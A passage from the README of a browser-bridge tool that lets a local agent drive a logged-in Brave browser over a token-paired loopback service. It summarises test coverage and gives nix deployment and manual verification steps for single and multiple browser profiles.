unchanged (regression), the depth cap, the target cap, a frame-spamming page staying
bounded, ambiguous duplicate-URL match → `ambiguous_frame`, a propagation timeout →
`frame_not_found:<url>`, an attach event arriving AFTER `setAutoAttach` resolved still
being caught, the listener removed on every path, and `upload --frame` on a grandchild
routing `DOM.setFileInputFiles` into the leaf session via the SAME shared resolver.
`frame_eval_cdp.test.mjs`
covers the `eval --frame` CDP `Runtime.evaluate` fix (same-process + OOPIF context
resolution, never-silent-null, #189 timeout no-wedge); `frame_oopif.test.mjs` covers the
OOPIF frame enumeration/resolution (incl. **host-preferred + ambiguity-safe** `--frame`
matching) and the injected page functions — the **click-exactly-once** synthetic click
(no double-fire) and the **no-editable-target** type refusal (no false `typed:N`); the
`protocol.test.mjs` cases cover the screenshot settle+retry decision logic
(`isTransientCaptureError` / `isCaptureQuotaError` / `captureWithRetry`): a spaced retry
never re-trips the ~2/sec quota, a non-transient error propagates immediately, and the
#182 quota error waits a full window. The live browser-driving loop (real DeepSeek + real
Brave) canNOT run in CI; the chrome.* glue in `service_worker.js` and the
end-to-end agent run are covered by the manual checklists (`extension/README.md` +
"opencode browser-agent" above). The two `opencode debug agent` checks under
"Manual live check" verify the bash-denied / typed-tool-only contract on a host
WITHOUT a model.

## Deploy (nix)

`nix/home.nix` deploys `server.py` to `~/.config/browser-bridge/server.py` and
runs it as the `browser-bridge` systemd **user** service (loopback, port 8788,
`X-Restart-Triggers` so `home-manager switch` restarts it on a code change). The
runtime token file lives alongside it in the same real dir.

```bash
home-manager switch --flake ~/workspace/devrc --impure
systemctl --user status browser-bridge
```

## End-to-end manual verification (the one step that needs real Brave)

1. `home-manager switch …` — starts the `browser-bridge` service on 127.0.0.1:8788.
2. Load the extension: Brave → `brave://extensions` → enable **Developer mode** →
   **Load unpacked** → select `scripts/browser-bridge/extension/`.
3. Open the extension's **options** (⋯ → Options / "Extension options"), paste the
   token from `~/.config/browser-bridge/token`, port `8788`, **Save**.
4. `scripts/browser-bridge/browser health` → `{"ok":true,"extension_connected":true}`.
5. Focus a tab where you are **logged in** (e.g. Gmail), then
   `scripts/browser-bridge/browser html | grep -i <your-name-or-account-marker>` —
   seeing logged-in-only markup **proves it's the live authenticated session**,
   not a fresh fetch.

### Verifying multiple instances

1. In a **second** Brave profile, load the same unpacked extension and pair it
   (token + port).
2. Give each profile a **unique label** in the extension options (e.g. `work`
   and `personal`), Save, and reload each extension card.
3. `scripts/browser-bridge/browser instances` → both show up (keys `work` /
   `personal`, each with its active-tab url).
4. `scripts/browser-bridge/browser html` with both connected → **errors** and
   lists the instances (it won't guess).
5. `scripts/browser-bridge/browser --instance work html` → returns the `work`
   profile's active tab; `--instance personal html` → the other. That per-tab
   difference confirms targeting.

⚠ After editing anything in `extension/`, click the **reload** ↻ on the
extension card in `brave://extensions` — Brave does not hot-reload unpacked
extensions.
